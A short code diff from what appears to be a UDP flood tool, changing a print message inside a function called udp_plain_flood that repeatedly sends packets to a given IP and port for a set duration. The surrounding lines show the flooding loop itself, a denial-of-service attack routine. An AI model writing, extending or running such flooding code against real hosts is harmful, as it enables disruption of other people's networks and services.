@@ -35,7 +35,7 @@ def udp_plain_flood(ip, port, duration, packet_size):
     try:
         while time.time() < end_time:
             time.sleep(0.2)
-            print(f"[+] UDP Plain flood complete! Sent {packet_count} packets.")
+            print(f"[*]\033[94m Starting UDP Plain flood on {ip}:\033[33m{port}\033[32m with {packet_size}\033[37m byte packets for {duration} seconds...")
             sock.sendto(payload, (ip, port))
             packet_count += 1
     except Exception as e:
